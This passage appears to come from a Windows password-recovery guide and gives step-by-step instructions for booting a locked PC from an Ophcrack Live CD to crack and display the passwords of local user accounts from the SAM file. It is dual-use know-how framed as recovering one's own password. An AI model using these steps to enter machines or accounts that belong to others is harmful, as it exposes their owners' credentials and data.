iii. Ophcrack   
When it comes to free Windows password crackers, users usually opt for Ophcrack as it is free 
and easily available.   
Step 1: Since we are assuming that your Windows PC is locked and you do not know the 
password, the first step needs to be carried out on a different PC with internet access and 
administrator privileges.    
Step 2: Download the correct version of Ophcrack Live CD from the official website to the 
second PC.   
Step 3: Burn the ISO file to a USB or CD. To do this, you will need an ISO burning 
application. Now proceed to the next step of the password reset process.   
Step 4: Remove the bootable media from the second PC and insert it into your locked 
Windows machine. Let the computer boot up from this media instead of the native Windows 
installation. This is made possible by the fact that Ophcrack itself contains a small operating 
system that can run independently of your Windows OS. In a few moments, you will see the 
Ophcrack interface on your computer.   
Step 5: You will now see a menu with 4 options. Leave it on the default option, which is 
automatic. After a few seconds, you will see the Ophcrack Live CD loading and then the disk 
partition information being displayed as Ophcrack identifies the one with the SAM file.   
Step 6: Once the process has been complete, you will see a window with several user accounts 
and their passwords displayed in column format. Against the previously locked username, look 
for an entry in the NT Pwd column.    
Step 7: This will be your recovered password, so note it down. You can now remove the Live 
CD from the drive and restart your computer. You will be able to login to your user account 
using the password that was recovered by Ophcrack.
